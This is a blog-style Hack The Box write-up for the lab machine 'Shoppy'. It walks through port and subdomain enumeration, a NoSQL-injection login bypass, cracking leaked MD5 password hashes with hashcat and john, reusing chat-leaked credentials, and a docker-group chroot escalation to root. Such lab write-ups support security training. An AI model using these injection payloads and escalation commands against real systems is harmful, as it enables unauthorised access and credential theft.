---
title: Hack the Box - Writeup (Shoppy)
description: This box consists of searching for the credentials on the webapp,
  and then find our way up to escalate our priviledges for root access to the
  machine.
category: Writeup
author:
  name: Farouk Mokhtari
  email: fmokhtari@mail.ru
  website: https://fmokhtari.com
  btc: 1JJmuidSTRCugnBKH8H7bDxEmTtAAg4kyn
  usdt: TWi6yNRhxzkmgZhhoriDzWgvrSsxbdQCb8
  xmr: 87Asjp2TLCkKnw3PYsiKaTDwL8mNhiL7uV67ptCtVxqbSnaZfATQ6t4d1mfWnKu4kB4ieQHMApGhUdUY3h4RKBS2Kuc5RyW
tags:
  - hackthebox
  - ctfs
date: 2022-12-10T08:53:17.813Z
---
## Introduction

Hello everybody, this machine (Shoppy) from Hack The Box is an easy one. It
consists of searching for the credentials on the webapp, and then find our way
up to escalate ur priviledges for root access to the machine.

## Enumeration

As usual we start our enumeration with an _nmap_ scan to see our open ports.

We have this output :

```shell
# Nmap 7.93 scan initiated Wed Dec  7 22:43:45 2022 as: nmap -sC -sV -v -oA 10.10.11.180-shoppy.txt 10.10.11.180
Nmap scan report for 10.10.11.180
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 9e5e8351d99f89ea471a12eb81f922c0 (RSA)
|   256 5857eeeb0650037c8463d7a3415b1ad5 (ECDSA)
|_  256 3e9d0a4290443860b3b62ce9bd9a6754 (ED25519)
80/tcp open  http    nginx 1.23.1
|_http-server-header: nginx/1.23.1
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Did not follow redirect to http://shoppy.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec  7 22:43:59 2022 -- 1 IP address (1 host up) scanned in 13.78 seconds

```

Now since we know there's only two ports open :

- 22 (ssh)
- 80 (http) We get a domain in here [shoppy.htb](http://shoppy.htb)

We continue our enumeration with a gobuster probe that gives these results :

```shell
gobuster -u http://shoppy.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html

```

![GoBuster](/images/shoppy/gobuster.png)

Now we notice there are two important pages **login** page and an **admin**
section. On the login page there's a vulnerability using NoSQL injection, we use
**admin'||'1==1** to exploit.

This will give us access to the admin panel :

![Dashboard](/images/shoppy/dashboard.png)

Once again here we search with NoSQL injection :

![Search](/images/shoppy/search.png)

We get a json file to download with all the users :

![Download](/images/shoppy/download.png)

```json
[
  {
    "_id": "62db0e93d6d6a999a66ee67a",
    "username": "admin",
    "password": "23c6877d9e2b564ef8b32c3a23de27b2"
  },
  {
    "_id": "62db0e93d6d6a999a66ee67b",
    "username": "josh",
    "password": "6ebcea65320589ca4f2f1ce039975995"
  }
]
```

We discover two users, **admin** and **josh**, with 2 hashes are _md5_. After
cracking them using **john the ripper**.

> **Note :** You can use **john the ripper** or **hashcat**,
> it doesn't matter, you'll get the same result.

Both commands are like so :

```shell
hashcat -m 0 hashfile /usr/share/dict/rockyou.txt

```

```shell
john --wordlist=/usr/share/dict/rockyou.txt hashfile

```

We got this for _josh_ :

```
username: josh
password: remembermethisway
```

At the same time we conduct another probing with **ffuf** for subdomain
enumeration. ffuf results are as follows :

```shell
ffuf -w bitquark-subdomains-top100000.txt -v -u http://shoppy.htb/ -H "Host: FUZZ.shoppy.htb" -fs 169
```

> **Note :** We add the **-fs** flag because we get a lot of pages with the
> same size and we want pages with different sizes.

```shell
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://shoppy.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.shoppy.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 169
________________________________________________

[Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 93ms]
| URL | http://shoppy.htb/
    * FUZZ: mattermost

:: Progress: [100000/100000] :: Job [1/1] :: 392 req/sec :: Duration: [0:04:42] :: Errors: 0 ::

```

We discover a subdomain **mattermost** to add to the _hosts_ file. After
accessing the sub we see this page :

![MatterMost](/images/shoppy/login.png)

Now, we can use the credentials we found for the user _josh_ on that subdomain.
And in the development section on the website we find an interesting disscution
between josh and what appears to be a sysadmin **jaeger**.

![sysadmin](/images/shoppy/sysadmin.png)

On the Deploy Machine channel we find some credentials for jaeger's account :

![Jaeger](/images/shoppy/jaeger.png)

```
username: jaeger
password: Sh0ppyBest@pp!
```

## Exploitation

So we use these credentials to access our machine via ssh. We find 2 users on
the machine, first _jaeger_ himself, the other is _deploy_. So, on the deploy
account we can find the password manager that josh was talking about.

We copy it to our account so we can run it. It's a simple program that spits out
credentials when the master password is given.

Let's try and find out what is the master password, using **xxd** we find our
password.

```shell
xxd password-manager | less
```

We scroll down the file and we find a section that gives the following :

![xxd](/images/shoppy/xdd.png)

The master password is **Sample**. Now after inserting the password, we got an
access granted and the output of _creds.txt_ file.

```shell
echo Sample | sudo -u deploy /home/deploy/password-manager
```

```shell
Welcome to Josh password manager!
Please enter your master password: Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```

## Priviledge Escalation

Now let's ssh into the deploy account. We are in the deployment account, we
notice that the user is a member of the docker group

```shell
groups deploy
deploy docker
```

And we notice that docker contains an image of alpine, so we can use this
command to get a root shell on the machine.

```shell
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Now you know the drill!
